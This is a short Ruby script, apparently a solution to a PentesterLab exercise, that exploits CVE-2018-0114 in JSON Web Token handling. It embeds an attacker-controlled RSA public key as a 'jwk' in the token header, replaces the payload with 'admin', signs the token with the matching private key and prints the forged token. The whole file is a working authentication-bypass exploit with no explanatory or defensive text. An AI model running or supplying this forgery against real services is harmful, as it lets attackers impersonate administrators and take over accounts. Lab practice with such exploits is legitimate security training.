require 'openssl'
require 'base64'
require 'json'

header, data, signature = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjQ4VUMxbWFINmQ0ckpQWkF3aE5pUks1bTlfdi1RSWEySFk0VkYxUnE5SlUifQ.dGVzdDE.F3nL_eic9m01x06iG4YWtzQCYYlJ4iuZ8Ys9UPmOGL-VEv4Qmeujr5q0t9hvkoA4G3pSRff0mxpJg5rd74IEBJPJTXF9yhY6OsmQHFC2-N0lF519smsH9D_bgJV8rt6E8B2Bu1eBVLRcQGA3TZQEfuDK6fCpmb6fWvsGyU3J7vE_avfZ-ZL09RF3gT4eT0s6KnKbAq4oxwNv8PPuyTLskbiZ0VzYyeH3q8IQgYF1KKncmVBByGHU6Q-yRnbo5sUqped8Vba7Wmr322Gv-XyDDvY9R_vjVtWoyM5G29HTmwo2ipFv04jLr6YmzYh8Aca5yaeoMjoSerWCVcDOl2_yJw".split(".")

priv = OpenSSL::PKey::RSA.new File.read 'cve-2018-0114.pem'
pub = priv.public_key
n = Base64.urlsafe_encode64(pub.n.to_s(2), padding: false)
e = Base64.urlsafe_encode64(pub.e.to_s(2), padding: false)

header = Base64.decode64(header)
data = Base64.decode64(data)
signature = Base64.decode64(signature)


kid = Base64.decode64("48UC1maH6d4rJPZAwhNiRK5m9_v-QIa2HY4VF1Rq9JU")

new_data=Base64.urlsafe_encode64("admin").gsub("=","")

header = {"alg" => "RS256", "jwk"=>{"kty"=>"RSA", "kid"=>"pentesterlab","use"=>"sig", "n"=>n, "e"=>e}}
token = Base64.urlsafe_encode64(header.to_json).gsub(/=+$/,"")+"."+new_data

sign = priv.sign("SHA256",token)

puts token+"."+Base64.urlsafe_encode64(sign).gsub(/=+$/,"")
